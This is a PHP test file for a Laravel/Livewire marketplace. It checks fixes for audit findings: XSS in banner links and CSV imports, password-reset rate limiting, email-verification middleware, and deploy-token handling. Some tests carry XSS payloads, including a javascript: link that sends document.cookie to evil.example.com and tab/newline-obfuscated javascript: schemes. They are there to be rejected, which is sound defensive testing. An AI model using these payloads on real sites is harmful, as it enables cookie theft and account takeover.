<?php

use App\Enums\ProductStatus;
use App\Livewire\Admin\Content\Banners;
use App\Livewire\Admin\Support\Tickets;
use App\Livewire\Seller\Products\BulkImport;
use App\Livewire\Storefront\Auth\ResetPassword;
use App\Models\Category;
use App\Models\Product;
use App\Models\Store;
use App\Models\User;
use App\Support\HtmlSanitizer;
use Database\Seeders\RoleSeeder;
use Illuminate\Auth\Middleware\EnsureEmailIsVerified;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\RateLimiter;
use Livewire\Livewire;
use Livewire\Mechanisms\HandleRequests\HandleRequests;
use Spatie\Permission\Models\Role;

// The security tail of the 2026-08-11 audit: M-17, M-16, M-3, M-1, M-5, and the
// admin ?tab= 500. Each of these fails against the code as it was.

function mediumsAdmin(array $permissions): User
{
    test()->seed(RoleSeeder::class);

    $admin = User::factory()->create(['two_factor_method' => 'email']); // EnsureAdmin requires 2FA
    $admin->assignRole('admin');
    $admin->syncPermissions($permissions);

    return $admin->fresh();
}

// ── M-17 · javascript: in a live storefront href ─────────────────────────
test('a banner link cannot carry a javascript scheme', function () {
    $admin = mediumsAdmin(['cms.manage']);

    Livewire::actingAs($admin)->test(Banners::class)
        ->call('create')
        ->set('title.en', 'Hero')
        ->set('linkUrl', 'javascript:fetch("//evil.example.com?c="+document.cookie)')
        ->set('image', UploadedFile::fake()->image('hero.jpg'))
        ->call('save')
        ->assertHasErrors(['linkUrl']);
});

// Browsers strip whitespace and control characters inside a scheme, so the
// obvious-looking guard (a plain str_starts_with) is not enough.
test('the obfuscated form is rejected too', function () {
    expect(HtmlSanitizer::isSafeUrl("java\tscript:alert(1)"))->toBeFalse()
        ->and(HtmlSanitizer::isSafeUrl("java\nscript:alert(1)"))->toBeFalse()
        ->and(HtmlSanitizer::isSafeUrl('JaVaScRiPt:alert(1)'))->toBeFalse();
});

// Relative paths must stay legal — home.blade.php branches on them for wire:navigate.
test('ordinary banner links still save', function () {
    $admin = mediumsAdmin(['cms.manage']);

    foreach (['/c/groceries-pantry', 'https://halalbizs.test/promo'] as $url) {
        Livewire::actingAs($admin)->test(Banners::class)
            ->call('create')
            ->set('title.en', 'Hero')
            ->set('linkUrl', $url)
            ->set('image', UploadedFile::fake()->image('hero.jpg'))
            ->call('save')
            ->assertHasNoErrors();
    }
});

// ── M-16 · the second writer the C2 sanitizer fix never reached ──────────
test('bulk import sanitises the description the PDP renders raw', function () {
    Role::firstOrCreate(['name' => 'seller', 'guard_name' => 'web']);
    $seller = User::factory()->create();
    $seller->assignRole('seller');
    $store = Store::factory()->approved()->create(['user_id' => $seller->id]);
    $category = Category::factory()->create();

    $csv = "name_en,name_ms,description_en,category_id,price_rm,stock,sku\n"
        ."Kurma Ajwa,Kurma Ajwa,\"<p>Nice</p><script>alert(1)</script>\",{$category->id},15.00,10,KUR-001\n";

    Livewire::actingAs($seller->fresh())->test(BulkImport::class)
        ->set('csv', UploadedFile::fake()->createWithContent('products.csv', $csv))
        ->call('import');

    $product = Product::query()->where('store_id', $store->id)->first();

    expect($product)->not->toBeNull()
        ->and($product->getTranslation('description', 'en'))->not->toContain('<script')
        ->and($product->status)->toBe(ProductStatus::Draft);
});

// ── M-3 · the only auth component with no limiter ────────────────────────
test('password reset is rate limited', function () {
    $user = User::factory()->create(['email' => 'reset-target@halalbizs.test']);
    $token = app('auth.password.broker')->createToken($user);

    // Six attempts with a wrong token: the sixth must be refused by the limiter
    // rather than handed to Password::reset() again.
    for ($i = 0; $i < 5; $i++) {
        Livewire::test(ResetPassword::class, ['token' => 'wrong-token'])
            ->set('email', $user->email)
            ->set('password', 'Str0ng!Passw0rd#2026')
            ->set('password_confirmation', 'Str0ng!Passw0rd#2026')
            ->call('resetPassword');
    }

    Livewire::test(ResetPassword::class, ['token' => $token])
        ->set('email', $user->email)
        ->set('password', 'Str0ng!Passw0rd#2026')
        ->set('password_confirmation', 'Str0ng!Passw0rd#2026')
        ->call('resetPassword')
        ->assertHasErrors(['email']);

    RateLimiter::clear('reset-password:'.strtolower($user->email).'|127.0.0.1');
});

// ── M-1 · verified survives the Livewire update endpoint ─────────────────
test('EnsureEmailIsVerified is applied to Livewire updates, not just the page', function () {
    $persistent = (new ReflectionClass(HandleRequests::class))->getName();

    // Assert on the registered list rather than the source text: this is a
    // runtime registration, and the bug was that the page door and the update
    // door disagreed about it.
    expect(Livewire::getPersistentMiddleware())
        ->toContain(EnsureEmailIsVerified::class)
        ->and($persistent)->toBeString();
});

// ── M-5 · an RCE-equivalent credential must not travel in a URL ──────────
test('the deploy webhook no longer accepts its token as a query parameter', function () {
    $source = file_get_contents(base_path('public/deploy.php'));

    expect($source)->not->toContain("\$_GET['token']")
        ->and($source)->toContain('HTTP_X_DEPLOY_TOKEN');
});

// ── LOW · ?tab=anything 500'd on an admin screen ─────────────────────────
test('an unknown support-ticket tab falls back instead of 500ing', function () {
    $admin = mediumsAdmin(['cms.manage']);

    Livewire::actingAs($admin)->test(Tickets::class, ['tab' => 'not-a-status'])
        ->assertOk();
});
